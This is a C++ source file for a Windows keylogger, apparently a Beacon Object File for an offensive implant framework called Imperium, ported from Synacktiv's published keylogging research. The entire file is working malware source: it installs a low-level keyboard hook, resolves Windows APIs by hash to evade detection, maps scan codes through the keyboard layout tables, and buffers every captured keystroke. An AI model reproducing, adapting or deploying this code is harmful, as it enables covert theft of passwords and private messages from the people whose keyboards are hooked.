#include <Imperium.h>
#include <Keylogger.h>

/*
 * this code is just a BOF implementation of synacktiv's dev team
 * research about keylogging. I've litteraly done nothing except
 * porting the code to a BOF. So all credits go the synacktiv
 * dev team for their amazing research on the subject.
 *
 * https://github.com/synacktiv/keebcap
 * https://www.synacktiv.com/en/publications/writing-a-decent-win32-keylogger-13
 */

/*!
 * @brief
 *  main function put your code here
 *
 * @param Param
 *  parameters
 */
FUNC VOID Main() {
    //
    // call LoadLibraryA to have the needed module is our peb
    // wont be able to resolve their functions otherwise
    //
    if ( ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), "user32.dll" ) ||
         ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), "advapi32.dll" )
    ) {
        return;
    }

    PRINTF_DEBUG( "Starting the keylogger..." );
    Keylogger::start();
}

namespace Keylogger {
    /*!
     * @brief
     *  start logging keystrokes
     *
     * @return
     */
    FUNC VOID start() {
        IMPERIUM_INSTANCE

        MSG   Msg  = { 0 };

        //
        // get the language struct
        // along with keyboard dll and language
        //
        if ( ! Instance()->Keylogger.Init ) {
            if ( ! ( store_kbdtables() ) ) {
                goto END;
            }

            Instance()->Keylogger.Init = TRUE;
        }

        //
        // store the threadid
        //
        Instance()->Keylogger.ThreadId = NtCurrentThreadId();

        //
        // set the window hook to capture keystrokes
        //
        if ( ! ( Instance()->Keylogger.Hook = Imperium::win32::call< fnSetWindowsHookExA >(
                     H_FUNC( "user32!SetWindowsHookExA" ),
                     WH_KEYBOARD_LL, callback, NULL, 0 )
        ) ) {
            PRINT_WIN32_ERROR( "SetWindowsHookExA" );
            goto END;
        }

        //
        // get keystrokes
        //
        while ( Imperium::win32::call< fnGetMessageA >(
            H_FUNC( "user32!GetMessageA" ),
            &Msg, NULL, 0, 0
        ) );

    END:
        //
        // clean
        //
        if ( Instance()->Keylogger.Hook ) Imperium::win32::call< fnUnhookWindowsHookEx >( H_FUNC( "user32!UnhookWindowsHookEx" ), Instance()->Keylogger.Hook );
        if ( Instance()->Keylogger.KbLang ) Imperium::mem::free( Instance()->Keylogger.KbLang );
        if ( Instance()->Keylogger.KbDll ) Imperium::mem::free( Instance()->Keylogger.KbDll );
    }

    /*!
     * @brief
     *  get a pointer onto the KBDTABLE of the language
     *
     * @param KbLang
     *  language of the keyboard
     *
     * @return
     *  pointer to language structure
     */
    FUNC BOOL store_kbdtables() {
        IMPERIUM_INSTANCE

        PSTR        KbDll         = { 0 };
        PSTR        KbLang        = { 0 };
        ULONG       DllSize       = { 0 };
        HKEY        RegKey        = { 0 };
        CHAR        RegPath[ 59 ] = "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\";
        PKBDTABLES  KbTables      = { 0 };
        SYMBOL_HASH SymHash       = { 0 };
        ULONG       LangSize      = { 0 };
        BOOL        ExitStatus    = { 0 };

        //
        // get the keyboard layout
        //
        Imperium::win32::call< fnGetKeyboardLayoutNameA >(
            H_FUNC( "user32!GetKeyboardLayoutNameA" ),
            RegPath + 50
        );

        //
        // open the registry key
        //
        if ( ! SUCCESS( Imperium::win32::call< fnRegOpenKeyExA >(
            H_FUNC( "advapi32!RegOpenKeyExA" ),
            HKEY_LOCAL_MACHINE, RegPath, 0, KEY_READ, &RegKey
        ) ) ) {
            PRINT_WIN32_ERROR( "RegOpenKeyExA" );
            goto END;
        }

        //
        // get the keyboard language
        // get the size first
        //
        Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout Text", nullptr, nullptr, KbDll, &LangSize
        );

        KbLang = Imperium::mem::alloc( LangSize );

        if ( ! SUCCESS( Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout Text", nullptr, nullptr, KbLang, &LangSize
        ) ) ) {
            PRINT_WIN32_ERROR( "RegQueryValueExA" );
            goto END;
        }

        //
        // get the DLL associated with the keyboard layout
        // get the size first
        //
        Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout File", nullptr, nullptr, KbDll, &DllSize
        );

        KbDll = Imperium::mem::alloc( DllSize );

        if ( ! SUCCESS( Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout File", nullptr, nullptr, KbDll, &DllSize
        ) ) ) {
            PRINT_WIN32_ERROR( "RegQueryValueExA" );
            goto END;
        }

        //
        // load the dll in the peb
        // so that win32::call can find it
        //
        if ( ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), KbDll ) ) {
            PRINT_WIN32_ERROR( "LoadLibraryA" );
            goto END;
        }

        //
        // get the structure
        //
        SymHash.Function = H_STR( "KbdLayerDescriptor" );
        SymHash.Module   = Imperium::crypto::hash_string( KbDll, DllSize );
        if ( ! ( KbTables = Imperium::win32::call< fnKbdLayerDescriptor >( SymHash ) ) ) {
            goto END;
        }

        //
        // copy the data into the global instance
        //
        Instance()->Keylogger.KbTables         = KbTables;
        Instance()->Keylogger.KbLang           = KbLang;
        Instance()->Keylogger.KbDll            = KbDll;
        Instance()->Keylogger.Modifiers.Size   = KbTables->pCharModifiers->wMaxModBits;
        Instance()->Keylogger.Modifiers.Buffer = Imperium::mem::alloc( Instance()->Keylogger.Modifiers.Size );
        ExitStatus                             = TRUE;

        PRINTF_DEBUG( "=> Table: 0x%08X", KbTables );
        PRINTF_DEBUG( "=> Language: %s", KbLang );
        PRINTF_DEBUG( "=> Keyboard DLL: %s", KbDll );

    END:
        //
        // cleanup
        //
        if ( RegKey ) Imperium::win32::call< fnRegCloseKey >( H_FUNC( "advapi32!RegCloseKey" ), RegKey );
        return ExitStatus;
    }

    /*!
     * @brief
     *  the callback function when a keystroke is hit
     */
    FUNC INT64 CALLBACK callback(
        IN ULONG            Code,
        IN PVOID            Param,
        IN PKBDLLHOOKSTRUCT DllHook
    ) {
        //
        // log that keystroke
        //
        log_key( DllHook->scanCode,
                 DllHook->flags & LLKHF_EXTENDED,
                 DllHook->flags & LLKHF_UP
        );

        //
        // forward the execution to the next hook
        //
        return Imperium::win32::call< fnCallNextHookEx >( H_FUNC( "user32!CallNextHookEx" ), NULL, Code, Param, DllHook );
    }

    /*!
     * @brief
     *  process keystrokes
     *
     * @param sc
     *  virtual scan code
     *
     * @param e0
     *  is the E0 extended flag set,
     *
     * @param e1
     *  is the E1 extended flag set?
     *
     * @param keyup
     *  is the event a key press(0) of a release (1)
     *
     * @param Vk
     *  virtual key associated to the key event
     */
    FUNC VOID log_key(
        IN BYTE sc,
        IN BOOL e0,
        IN BOOL keyup
    ) {
        IMPERIUM_INSTANCE
        PKBDTABLES KbTables  = Instance()->Keylogger.KbTables;
        USHORT     Vk        = { 0 };
        WCHAR      Character = { 0 };

        //
        // convert the scan code to a virtual key
        //
        if ( ! ( Vk = sc_to_vk( KbTables, sc, e0 ) ) ) {
            return;
        }

        //
        // keyup is interesting for things like shift, ctrl...
        //
        if ( handle_modifiers( KbTables, &Vk ) ) {
            //
            // that key was a modifer
            // got nothing left to do so return
            //
            return;
        }

        //
        // the callback gets called twice
        // one for the key press and one for the key release
        // only process each key once if not a modifer key
        // also process lock keys
        //
        if ( keyup || handle_lockkeys( Vk ) ) {
            //
            // that key was lock key or had already been processed
            // got nothing left to do so return
            //
            return;
        }

        //
        // fix the virtual keys associated with the NUMPAD
        // if the NUMLOCK is enforced
        //
        if ( Instance()->Keylogger.Locks & ModCapitalLock ) {
            fix_numpad_vk( &Vk );
        }

        //
        // convert to wchar
        //
        if ( ! ( Character = vk_to_wchar( KbTables, Vk ) ) ) {
            return;
        }

        //
        // store the character
        //
        store_character( Character );

        //
        // increase the number of stored character
        //
        Instance()->Keylogger.Count++;
    }

    /*!
     * @brief
     *  store a character
     *
     * @param Character
     *  character to store
     */
    FUNC VOID store_character(
        IN WCHAR Character
    ) {
        IMPERIUM_INSTANCE

        PKEYSTROKES *Keystrokes = &Instance()->Keylogger.Keystrokes;

        if ( *Keystrokes ) {
            //
            // get the last keystrokes structure
            //
            while ( ( *Keystrokes )->Next && ( Keystrokes = &( *Keystrokes )->Next ) );

            if ( ( *Keystrokes )->Keys.MaximumLength == ( *Keystrokes )->Keys.Length ) {
                //
                // that structure is full allocate a new one
                //
                Keystrokes  = &( *Keystrokes )->Next;
                *Keystrokes = Imperium::mem::alloc( sizeof( KEYSTROKES ) );
            }
        } else {
            //
            // create the first keystrokes structure
            //
            *Keystrokes = Imperium::mem::alloc( sizeof( KEYSTROKES ) );
        }

        //
        // check if there is a buffer available
        //
        if ( ( *Keystrokes )->Keys.MaximumLength == 0 ) {
            //
            // allocate memory for the buffer
            //
            ( *Keystrokes )->Keys.MaximumLength = 100;
            ( *Keystrokes )->Keys.Buffer        = Imperium::mem::alloc( 100 );
        }

        //
        // store that character
        //
        ( *Keystrokes )->Keys.Buffer[ ( *Keystrokes )->Keys.Length++ ] = Character;
    }

    /*!
     * @brief
     *  convert a scan code to a virtual key
     *
     * @param KbTables
     *  keyboard tables
     *
     * @param sc
     *  the scan code to convert
     *
     * @param e0
     *   is the E0 extended flag set?
     *
     * @param e1
     *  is the E1 extended flag set,
     *
     * @return
     *  virtual key
     */
    FUNC USHORT sc_to_vk(
        IN PKBDTABLES KbTables,
        IN BYTE       sc,
        IN BOOL       e0
    ) {
        USHORT  Vk    = { 0 };
        PVSC_VK VscVk = { 0 };

        //
        // convert the scan code a key
        //
        if ( sc < KbTables->bMaxVSCtoVK ) {
            Vk = KbTables->pusVSCtoVK[ sc ];

            if ( ! ( Vk & KBDEXT && ! e0 ) &&
                 ! ( ! ( Vk & KBDEXT ) && e0 )
            ) {
                return Vk;
            }
        }

        //
        // search in extended scan codes 0
        //
        VscVk = KbTables->pVSCtoVK_E0;


        do {
            if ( sc == VscVk->Vsc ) {
                //
                // found a matching entry
                //
                return VscVk->Vk;
            }
        } while ( ( ++VscVk )->Vsc );

        //
        // search in extended scan codes 1
        //
        VscVk = KbTables->pVSCtoVK_E1;
        do {
            if ( sc == VscVk->Vsc ) {
                //
                // found a matching entry
                //
                return VscVk->Vk;
            }
        } while ( ( ++VscVk )->Vsc );

        return 0;
    }

    /*!
     * @brief
     *  fix the numpad virtual keys
     *
     * @param Vk
     *  virtual key to fix
     */
    FUNC VOID fix_numpad_vk(
        OUT PUSHORT Vk
    ) {
        switch ( *Vk ) {
            case VK_INSERT :
                *Vk = VK_NUMPAD0;
                break;
            case VK_END :
                *Vk = VK_NUMPAD1;
                break;
            case VK_DOWN :
                *Vk = VK_NUMPAD2;
                break;
            case VK_NEXT :
                *Vk = VK_NUMPAD3;
                break;
            case VK_LEFT :
                *Vk = VK_NUMPAD4;
                break;
            case VK_CLEAR :
                *Vk = VK_NUMPAD5;
                break;
            case VK_RIGHT :
                *Vk = VK_NUMPAD6;
                break;
            case VK_HOME :
                *Vk = VK_NUMPAD7;
                break;
            case VK_UP :
                *Vk = VK_NUMPAD8;
                break;
            case VK_PRIOR :
                *Vk = VK_NUMPAD9;
                break;
        }
    }

    /*!
     * @brief
     *  convert a virtual key to a wide char
     *
     * @param KbTables
     *  lang keyboard table
     *
     * @param Vk
     *  virtual key
     *
     * @return
     *  the character
     */
    FUNC WCHAR vk_to_wchar(
        IN PKBDTABLES KbTables,
        IN USHORT     Vk
    ) {
        IMPERIUM_INSTANCE

        PVK_TO_WCHAR_TABLE Pvk2WchTable = KbTables->pVkToWcharTable;
        PVK_TO_WCHARS      Pvk2Wch      = { 0 };
        BYTE               ModNumber    = { 0 };

        //
        // iterate through all VK_TO_WCHAR_TABLE
        // nModifications is the number of elements in the wch member of pVkToWchars
        // 5 modifications means a virtual key can be up to 5 characters
        // cbSize is the according size of the VK_TO_WCHARS struct because it changes
        // based on the number of modifications
        //
        do {
            //PRINTF( "=> nModifications: %d\n", Pvk2WchTable->nModifications );

            Pvk2Wch = Pvk2WchTable->pVkToWchars;
            do {
                if ( Pvk2Wch->VirtualKey == Vk ) {
                    //
                    // check if the capslock is pressed
                    //
                    if ( Instance()->Keylogger.Locks & ModCapitalLock ) {
                        //
                        // change the shift mod number
                        // always at index 1 on french keyboard
                        // todo: check other keyboards
                        //
                        ModNumber = KbTables->pCharModifiers->ModNumber[ 1 ];
                    }

                    //
                    // loop through all possible modifiers can be possibly applied to the current character
                    //
                    for ( int i = 0 ; i < Instance()->Keylogger.Modifiers.Size ; i++ ) {
                        //
                        // check if the modifier is applied
                        //
                        if ( Instance()->Keylogger.Modifiers.Buffer[ i ] ) {
                            //
                            // the modifier is applied
                            // get the mod number associated with it
                            //
                            ModNumber = KbTables->pCharModifiers->ModNumber[ i ];
                            break;
                        }
                    }

                    //
                    // get the characters associated with that modifier
                    // check the mod number is lower than the maximum allowed
                    // (check it is valid)
                    //
                    if ( ModNumber >= Pvk2WchTable->nModifications ) {
                        return 0;
                    }

                    //
                    // seems valid, return that character
                    //
                    return Pvk2Wch->wch[ ModNumber ];
                }
            } while ( ( Pvk2Wch = C_PTR( Pvk2Wch ) + Pvk2WchTable->cbSize ) && Pvk2Wch->VirtualKey );
        } while ( ( ++Pvk2WchTable )->cbSize );

        return 0;
    }

    /*!
     * @brief
     *  handle locks like NUMLOCK, CAPSLOCK...
     *
     * @brief Vk
     *  virtual key
     *
     * @return
     *  true if the key was a lock key and was handled
     */
    FUNC BOOL handle_lockkeys(
        IN USHORT Vk
    ) {
        IMPERIUM_INSTANCE

        BYTE Lock = { 0 };

        //
        // handle lock keys
        // problem: i do not the initial state of those keys
        // (the state before the keylogger starts)
        //
        switch ( Vk ) {
            case VK_CAPITAL :
                Lock = ModCapitalLock;
                break;
            case VK_NUMLOCK :
                Lock = ModNumLock;
                break;
            case VK_SCROLL :
                Lock = ModScrollLock;
                break;
        }

        if ( Lock ) {
            Instance()->Keylogger.Locks = Instance()->Keylogger.Locks ^ Lock;
        }

        return ( Lock ) ? TRUE : FALSE;
    }

    /*!
     * @brief
     *  handle modifiers keys like SHIFT, CONTROL...
     *
     * @return
     *  true if the key was a modifier and was handled
     */
    FUNC BOOL handle_modifiers(
        IN PKBDTABLES  KbTables,
        IN OUT PUSHORT Vk
    ) {
        IMPERIUM_INSTANCE

        PMODIFIERS Modifiers = KbTables->pCharModifiers;
        BYTE       ModBit    = { 0 };

        //
        // adjust to generic versions
        //
        switch ( *Vk ) {
            case VK_RSHIFT :
            case VK_LSHIFT :
                *Vk = VK_SHIFT;
                break;
            case VK_LCONTROL :
            case VK_RCONTROL :
                *Vk = VK_CONTROL;
                break;
            case VK_LMENU :
                *Vk = VK_MENU;
                break;
            case VK_RMENU :
                if ( TRUE ) {
                    //
                    // if there is an ALT-GR key on the keyboard
                    //
                    *Vk = VK_CONTROL;
                } else {
                    // set VK_CONTROL & VK_MENU in the states
                }
                break;
        }

        //
        // loop through the keyboard language modifiers
        //
        for ( int i = 0 ; i < Modifiers->wMaxModBits ; i++ ) {
            if ( *Vk == Modifiers->pVkToBit[ i ].Vk ) {
                //
                // that key is a modifer
                // store the modbit with or op
                // later convert that into an index of ModNumber array
                // todo: fix resolution problems if a modifier was pressed when the keylogger starts
                //
                ModBit = Modifiers->pVkToBit[ i ].ModBits;

                Instance()->Keylogger.Modifiers.Buffer[ ModBit ] = ! Instance()->Keylogger.Modifiers.Buffer[ ModBit ];

                return TRUE;
            }
        }

        return FALSE;
    }
}
